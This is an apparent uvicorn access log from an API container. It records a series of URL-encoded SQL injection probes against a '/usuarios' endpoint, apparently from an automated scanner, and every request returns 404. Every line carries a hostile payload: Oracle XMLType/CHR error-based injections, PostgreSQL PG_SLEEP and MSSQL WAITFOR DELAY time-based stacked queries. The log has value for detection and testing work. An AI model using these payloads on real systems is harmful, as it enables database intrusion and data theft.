api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:59548 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/3910%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%283910%3D3910%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%288291%3D8291 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59580 - "GET /usuarios/%2A%2A/AND/%2A%2A/3910%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%283910%3D3910%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59590 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/3910%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%283910%3D3910%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%28%27HSko%27%3D%27HSko HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59600 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/3910%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%283910%3D3910%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%27RLZG%27%3D%27RLZG HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59602 - "GET /usuarios/%2A%2A/AND/%2A%2A/3910%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%283910%3D3910%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29--/%2A%2A/wcFS HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59624 - "GET /%28SELECT/%2A%2A/CONCAT%28CONCAT%28%27qqkbq%27%2C%28CASE/%2A%2A/WHEN/%2A%2A/%289888%3D9888%29/%2A%2A/THEN/%2A%2A/%271%27/%2A%2A/ELSE/%2A%2A/%270%27/%2A%2A/END%29%29%2C%27qqkqq%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59628 - "GET /usuarios%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59632 - "GET /usuarios%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59648 - "GET /usuarios%27%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59616 - "GET /usuarios%27%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59650 - "GET /usuarios%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59666 - "GET /usuarios%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59670 - "GET /usuarios%27%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
